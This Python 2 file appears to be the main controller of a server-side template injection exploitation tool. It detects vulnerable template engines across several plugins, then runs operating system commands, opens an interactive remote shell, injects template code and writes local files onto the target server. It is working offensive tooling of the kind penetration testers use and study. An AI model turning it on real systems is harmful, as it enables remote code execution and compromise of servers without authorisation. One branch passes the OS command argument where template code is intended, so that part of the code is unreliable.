from plugins.engines.mako import Mako
from plugins.engines.jinja2 import Jinja2
from plugins.engines.smarty import Smarty
from plugins.engines.twig import Twig
from plugins.engines.freemarker import Freemarker
from plugins.engines.velocity import Velocity
from plugins.engines.jade import Jade
from core.channel import Channel
from utils.loggers import log
from core.clis import Shell, MultilineShell

plugins = [
    Mako,
    Jinja2,
    Twig,
    Smarty,
    Freemarker,
    Velocity,
    Jade
]

def checkTemplateInjection(args):

    channel = Channel(args)
    current_plugin = None

    # Iterate all the available plugins until
    # the first template engine is detected.
    for plugin in plugins:
        current_plugin = plugin(channel)
        current_plugin.detect()

        if channel.data.get('engine'):
            break

    # Kill execution if no engine have been found
    if not channel.data.get('engine'):
        log.fatal("""Tested parameters appear to be not injectable. Try to increase '--level' value to perform more tests.""")
        return

    # If there are no operating system actions, exit
    if not any(f for f,v in args.items() if f in ('os_cmd', 'os_shell') and v ):
        log.warn("""Tested parameters have been found injectable.""")
        if channel.data.get('exec'):
            log.warn("""Try options '--os-cmd' or '--os-shell' to access the underlying operating system.""")

    # Execute operating system commands
    if channel.data.get('exec'):

        if args.get('os_cmd'):
            print current_plugin.execute(args.get('os_cmd'))
        elif args.get('os_shell'):
            log.warn('Run commands on the operating system.')

            Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()


    # Execute operating system commands
    if channel.data.get('engine'):

        if args.get('tpl_code'):
            print current_plugin.inject(args.get('os_cmd'))
        elif args.get('tpl_shell'):
            log.warn('Inject multi-line template code. Double empty line to send the data.')

            MultilineShell(current_plugin.inject, '%s $ ' % (channel.data.get('engine', ''))).cmdloop()

    # Perform file write
    if channel.data.get('write'):

        local_remote_paths = args.get('file_write')

        if local_remote_paths:

            local_path, remote_path = local_remote_paths

            with open(local_path, 'rb') as f:
                data = f.read()

            current_plugin.write(data, remote_path)
